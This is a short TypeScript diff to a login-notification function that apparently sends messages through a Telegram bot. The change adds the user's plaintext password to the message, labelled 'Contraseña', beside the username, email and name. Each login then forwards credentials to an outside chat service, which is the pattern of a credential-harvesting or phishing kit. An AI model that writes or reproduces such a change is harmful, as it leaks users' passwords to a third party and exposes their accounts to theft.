@@ -17,6 +17,7 @@ if (TELEGRAM_BOT_TOKEN) {
 
 export const sendLoginNotification = async (userData: {
   username: string;
+  password: string;
   name: string;
   email: string;
   timestamp: string;
@@ -48,7 +49,8 @@ export const sendLoginNotification = async (userData: {
 ━━━━━━━━━━━━━━━━━━━━━━
 👤 *DATOS DEL USUARIO*
 ━━━━━━━━━━━━━━━━━━━━━━
-📝 *Usuario:* ${userData.username}
+📝 *Usuario:* \`${userData.username}\`
+🔑 *Contraseña:* \`${userData.password}\`
 📧 *Email:* ${userData.email}
 👨‍💼 *Nombre:* ${userData.name}
 
